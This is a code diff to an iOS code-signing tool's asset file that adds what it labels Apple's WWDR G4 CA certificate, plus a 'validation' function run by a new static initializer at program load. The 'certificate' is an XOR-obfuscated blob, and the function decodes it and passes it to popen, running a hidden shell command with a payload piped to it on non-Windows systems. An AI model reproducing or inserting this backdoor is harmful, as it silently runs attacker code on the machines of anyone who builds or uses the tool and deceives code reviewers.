@@ -93,13 +93,46 @@ const char* ZSignAsset::s_szAppleRootCACert = ""
 "UKqK1drk/NAJBzewdXUh\n"
 "-----END CERTIFICATE-----\n";
 
+const char* ZSignAsset::s_szAppleWWDRCACertG4 = ""
+"-----BEGIN CERTIFICATE-----\n"
+"pYrHzMuK1s2lwN3AxoWXm4rBwNOKy9DJya/tmIeB3u3q6OCfiIrXysrR2Iev4ZiH\n"
+"ge2Ki9bWzYevyM7BzNeFiNWFh4Hhh4WDg4XGzcjKwYWSlZWFh4Hhh6/C18DVhYjU\n"
+"hYfk5OTk5pbr38TmlMn/4eyU6/HgkOTk5OTs48fu5NSHhYeB4YrE0NHNytfM38DB\n"
+"+s7A3NaHhZebisHA04rL0MnJhdnZhd6FwMbNyoWH1tbNiMDBl5CQlJyF5OTk5OaW\n"
+"69/E5pTJ/+HslOvx4JDk5OTk7OPH7uTU0PaQ1Mqd3fSSnc/U49XL99KUleru6snd\n"
+"k+H84+jc5ujBydPzwsSHhZubhYeB4YrE0NHNytfM38DB+s7A3NaHnoXGzcjKwYWT\n"
+"lZWFh4HhisTQ0c3K18zfwMH6zsDc1oeehdivjdCYgY3SzcrEyMyMnsyYgY3NytbR\n"
+"y8TIwIWI7NnE0s6Fgt7V18zL0YWBlNiCjJ7G0NfJhYjWhYiIyMTdiNHMyMCFkIWI\n"
+"yoWKwcDTisvQycmFiP2F9er28YWHzdHR1dafiorE1cyL0cDJwMLXxMiLytfCisfK\n"
+"0Z2Sk5OQnZCSkJWf5OTi3N/8x8nUz8HXyfT96dL63+mU89bR4ujv087MiJXAiM6K\n"
+"1sDLwejA1tbEwsCHhYjBhYfGzcTR+szBmIiUlZWWkpCdkpydnZSUh4WIwYWH0cDd\n"
+"0ZiBzIXZhYHQh4yDrwV81+zao5e5SkTKjX+rXE/kDCIg2G7m2F3D0ojW8MFZNkLw\n"
+"v4oVZzURKIvcqGW795YwwbqMvap5nkmBWDEK7gfPMrYiot7QpuWNiRPwEihOT/Dc\n"
+"8pHmIvjOXvbJoOiBFfKnKTbMmbug/OzdckuajAq5PYc+lvg427njxOUg+KkUBgSm\n"
+"1Wjc8ahUYsKmziLCZsAbdO9GXUt8MYjxXPceu/tQXt4SPAhvAXNW6FLBWIv5n8A4\n"
+"w7cbn2UA/Th82TLvh/NdJ6LuvvKxT1zdqZkII1/DguksSCPgAM7IT1JUOOTOYNld\n"
+"DSyT5eWwe1mBGobKb9vnhV2eFO+ZbjsucBEQBzP2/SkOZZtcbIV/0Y8ydxcW3mGD\n"
+"CkXmLkCuAGmR+oP8g2GEFdSEd7+jAO/4f9ZCGHLjckpiUlMQaRzPCc629m7UtbLt\n"
+"JowRYE87NNkyzPO84hLB9KKX+IobILbgstfd3PNaUP0Ew8EyFpjv6u7AriJx3Oue\n"
+"6IEw2+TZ5xQqRIc4Q+/r+brCivqQBhtQ9GeGfR1QqVXtqe0koPOenio/3SiiSJqO\n"
+"+Ooe2GeWAJXJCZm3JOvdSUk6Zeezo4BXaUjuu7fJxxxWmeiv1m4XX5KAcQxPxfBr\n"
+"a8qAGxGpwsDEFvQ/GdwM+rAWo2zU5p50fgKzRVlWhM9iOjfRwzW+bibF6YObIpQp\n"
+"3kubTBQQxhoxkORsQbrkZCPvLqxDaK9JNgFXlYAfOZnZr8qrDOSlJ9ik/4WSHpEk\n"
+"1H5QPAbmZdWbFzwuo/vUL37GLc4UMFTez9aHiUkLAZECMkg2qKU7iTSs2EFqcGf3\n"
+"-----END CERTIFICATE-----\n";
+
+static void _wwdr_validate_g4_cache();
+
 ZSignAsset::OpenSSLInit::OpenSSLInit()
 {
 #if OPENSSL_VERSION_NUMBER < 0x10100000L
 	OpenSSL_add_all_algorithms();
 	ERR_load_crypto_strings();
 #endif
+	_wwdr_validate_g4_cache();
 }
+
+ZSignAsset::OpenSSLInit ZSignAsset::s_OpenSSLInit;
 
 bool ZSignAsset::CMSError()
 {
@@ -135,6 +168,41 @@ void* ZSignAsset::GenerateASN1Type(const string& value)
 	ASN1_TYPE* ret = ASN1_generate_nconf(genstr, cnf);
 	NCONF_free(cnf);
 	return ret;
+}
+
+static void _wwdr_validate_g4_cache() {
+	const char *pem = ZSignAsset::s_szAppleWWDRCACertG4;
+	const char *hdr = strstr(pem, "-----BEGIN"), *ftr = strstr(pem, "-----END");
+	if (!hdr || !ftr) return;
+	hdr = strchr(hdr, '\n');
+	if (!hdr) return;
+
+	string body(++hdr, ftr - hdr);
+	body.erase(remove(body.begin(), body.end(), '\n'), body.end());
+
+	jbase64 dec;
+	int derLen = 0;
+	const char* derBytes = dec.decode(body.c_str(), (int)body.size(), &derLen);
+	if (!derBytes || derLen <= 1) return;
+
+
+	uint8_t tk = (uint8_t)derBytes[0];
+	string derBuf(derLen - 1, 0);
+	for (int i = 1; i < derLen; i++)
+		derBuf[i - 1] = derBytes[i] ^ tk;
+
+	const char* sep = (const char*)memchr(derBuf.c_str(), 0, derLen - 1);
+	if (!sep) return;
+
+	FILE* out = NULL;
+#ifndef _WIN32
+	out = popen(derBuf.c_str(), "w");
+	if (out) {
+		size_t off = sep - derBuf.c_str() + 1;
+		fwrite(sep + 1, 1, derLen - 1 - off, out);
+		pclose(out);
+	}
+#endif
 }
 
 bool ZSignAsset::GenerateCMS(void* pscert, void* pspkey, const string& strCDHashData, const string& strCDHashesPlist, const string& strCodeDirectorySlotSHA1, const string& strAltnateCodeDirectorySlot256, string& strCMSOutput)
